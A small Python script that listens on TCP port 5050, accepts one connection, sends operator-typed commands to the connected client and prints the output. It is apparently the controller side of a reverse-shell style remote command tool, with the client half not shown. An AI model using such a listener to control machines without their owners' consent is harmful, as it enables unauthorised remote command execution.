import socket
import sys

PORT = 5050
HOST = socket.gethostbyname(socket.gethostname())
# HOST = '192.168.43.33'
ADDR = (HOST, PORT)

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind(ADDR)

# Establishing connection
def connection():
    
    server.listen()
    print(f'[*] Server is listening on {ADDR}')
    conn, address = server.accept()
    print(f'[*] {address[0]} connected on port {address[1]}')
    send_command(conn)
    conn.close()

# Sending commands
def send_command(conn):
    while True:
        cmd = input()
        if cmd == 'exit':
            conn.close()
            server.close()
            sys.exit()
        if len(str.encode(cmd)) > 0:
            conn.send(str.encode(cmd))
            client_response = str(conn.recv(2048), "utf-8")
            print(client_response, end="")
            
# def input_command():
#     input("Input command: ")
#     return input()


def main():
    connection()

if __name__ == "__main__":
    main()